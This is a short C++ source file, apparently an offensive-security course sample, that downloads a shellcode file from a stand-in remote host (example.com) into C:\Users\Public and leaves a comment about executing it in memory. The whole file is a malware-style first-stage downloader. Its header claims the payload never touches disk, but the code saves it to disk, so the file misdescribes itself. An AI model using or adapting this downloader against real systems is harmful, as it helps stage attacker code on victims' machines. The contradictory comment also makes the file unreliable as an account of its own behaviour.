// Filename: remote_payload_exec.cpp
// Purpose: Download and execute payload directly from remote server (no touching disk).
// Instructor: Joas A Santos - https://www.linkedin.com/in/joas-antonio-dos-santos - https://github.com/CyberSecurityUP

#include <windows.h>
#include <urlmon.h>
#include <iostream>
#pragma comment(lib, "urlmon.lib")

int main() {
    const char* url = "http://example.com/shellcode.bin";
    const char* localPath = "C:\\Users\\Public\\sc.bin";

    HRESULT hr = URLDownloadToFileA(NULL, url, localPath, 0, NULL);
    if (SUCCEEDED(hr)) {
        std::cout << "Payload downloaded to " << localPath << "\n";
        // Optionally, memory execute the shellcode from file
    } else {
        std::cerr << "Download failed with HRESULT: 0x" << std::hex << hr << "\n";
    }

    return 0;
}
